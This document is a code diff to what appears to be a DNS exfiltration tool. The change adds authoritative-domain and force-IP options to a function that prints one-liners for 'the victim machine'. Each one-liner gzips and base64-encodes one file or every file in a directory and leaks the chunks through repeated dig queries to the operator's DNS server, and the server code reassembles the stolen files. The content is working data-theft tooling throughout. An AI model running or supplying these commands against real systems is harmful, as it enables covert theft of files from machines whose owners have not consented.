@@ -255,10 +255,12 @@ def save_file(key, value, z):
     logger.info("Saved file", file=fname, md5sum=md5sum)
 
 
-def p_cmds(s, b, ip, z):
+def p_cmds(s, b, ip, z, domain, force_ip):
 
     logger.info("On the victim machine, use any of the following commands:")
     logger.info("Remember to set filename for individual file transfer.")
+    dig = f"dig @{ip}" if force_ip or domain is None else "dig"
+    domain_str = f".{domain}" if domain is not None else ""
     if z:
         logger.info(
             "Copy individual file (ZIP enabled)",
@@ -266,8 +268,8 @@ def p_cmds(s, b, ip, z):
                 f"\t{c['r']}\x23{c['e']} {c['y']}f=file.txt{c['e']}; s={s};b={b};c=0;ix=0; "
                 'for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\\n/g");do '
                 'if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); '
-                f'do dig @{ip} `echo -ne 3x6-.${{ix}}-.$r$f|tr "+" "*"` +short;ix=$(($ix+1)); done; '
-                f'dig @{ip} `echo 3x7-.0-.$f|tr "+" "*"`'
+                f'do {dig} `echo -ne 3x6-.${{ix}}-.$r$f{domain_str}|tr "+" "*"` +short;ix=$(($ix+1)); done; '
+                f'{dig} `echo 3x7-.0-.$f{domain_str}|tr "+" "*"`'
             ),
         )
         logger.info(
@@ -276,8 +278,8 @@ def p_cmds(s, b, ip, z):
                 f"\t{c['r']}\x23{c['e']} for f in $(ls .); do s={s};b={b};c=0;ix=0; "
                 'for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\\n/g");do '
                 'if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); '
-                f'do dig @{ip} `echo -ne 3x6-.${{ix}}-.$r$f|tr "+" "*"` +short;ix=$(($ix+1)); done; '
-                f'dig @{ip} `echo 3x7-.0-.$f|tr "+" "*"`; done;'
+                f'do {dig} `echo -ne 3x6-.${{ix}}-.$r$f{domain_str}|tr "+" "*"` +short;ix=$(($ix+1)); done; '
+                f'{dig} `echo 3x7-.0-.$f{domain_str}|tr "+" "*"`; done;'
             ),
         )
     else:
@@ -287,8 +289,8 @@ def p_cmds(s, b, ip, z):
                 f"f=file.txt{c['e']}; s={s};b={b};c=0;ix=0; "
                 'for r in $(for i in $(base64 -w0 $f| sed "s/.\{$b\}/&\\n/g");do '
                 'if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); '
-                f'else echo -ne "\\n$i-."; c=1; fi; done ); do dig @{ip} `echo -ne 3x6-.${{ix}}-.$r$f|tr "+" "*"` +short;ix=$(($ix+1)); done; '
-                f'dig @{ip} `echo 3x7-.0-.$f|tr "+" "*"`'
+                f'else echo -ne "\\n$i-."; c=1; fi; done ); do {dig} `echo -ne 3x6-.${{ix}}-.$r$f{domain_str}|tr "+" "*"` +short;ix=$(($ix+1)); done; '
+                f'{dig} `echo 3x7-.0-.$f{domain_str}|tr "+" "*"`'
             ),
         )
         logger.info(
@@ -297,8 +299,8 @@ def p_cmds(s, b, ip, z):
                 f"for f in $(ls .); do s={s};b={b};c=0;ix=0; "
                 'for r in $(for i in $(base64 -w0 $f | sed "s/.\{$b\}/&\\n/g");do '
                 'if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else '
-                f'echo -ne "\\n$i-."; c=1; fi; done ); do dig @{ip} `echo -ne 3x6-.${{ix}}-.$r$f|tr "+" "*"` +short; ix=$(($ix+1)); done; '
-                f'dig @{ip} `echo 3x7-.0-.$f|tr "+" "*"`; done;'
+                f'echo -ne "\\n$i-."; c=1; fi; done ); do {dig} `echo -ne 3x6-.${{ix}}-.$r$f{domain_str}|tr "+" "*"` +short; ix=$(($ix+1)); done; '
+                f'{dig} `echo 3x7-.0-.$f{domain_str}|tr "+" "*"`; done;'
             ),
         )
 
@@ -357,6 +359,18 @@ Advanced:\n"""
     )
     parser.add_argument("-l", "--log-file", type=str, help="log file location")
     parser.add_argument(
+        "-d",
+        "--domain",
+        type=str,
+        help="(Optionally) The base domain of your authoritative DNS server",
+    )
+    parser.add_argument(
+        "--force-ip",
+        dest="force_ip",
+        action="store_true",
+        help="If DNS IP should be queried directly even when using an authoritative DNS",
+    )
+    parser.add_argument(
         "--no-color",
         dest="color",
         action="store_false",
@@ -370,6 +384,7 @@ Advanced:\n"""
         b=56,
         f=17,
         color=True,
+        force_ip=False,
     )
 
     args = parser.parse_args()
@@ -379,6 +394,7 @@ Advanced:\n"""
     b = args.b
     flen = args.f
     ip = args.ip
+    domain = args.domain
     log_level = logging.DEBUG if args.v else logging.INFO
 
     configure_logging(
@@ -396,10 +412,11 @@ Advanced:\n"""
 
     magic_nr_size = 4
     max_index = 5
+    domain_len = 0 if domain is None else len(domain)
     if (
         (b > 63)
         or ((b * s) > 253)
-        or (((b * s) + flen + magic_nr_size + max_index) > 253)
+        or (((b * s) + flen + domain_len + magic_nr_size + max_index) > 253)
     ):
         parser.print_help()
         logger.error(
@@ -419,7 +436,7 @@ Advanced:\n"""
         exit(1)
 
     logger.info("DNS server listening", ip=ip, port=53)
-    p_cmds(s, b, ip, z)
+    p_cmds(s, b, ip, z, domain, args.force_ip)
     logger.info("Once files have sent, use Ctrl+C to exit and save.")
 
     try:
@@ -447,6 +464,10 @@ Advanced:\n"""
                     fname += req_split[n] + b"."
 
             fname = fname[:-1]
+
+            # remove domain part when using auth DNS
+            if domain is not None:
+                fname = fname.replace(b"." + domain.encode("utf-8"), b"")
 
             if fname not in r_data:
                 r_data[fname] = {}
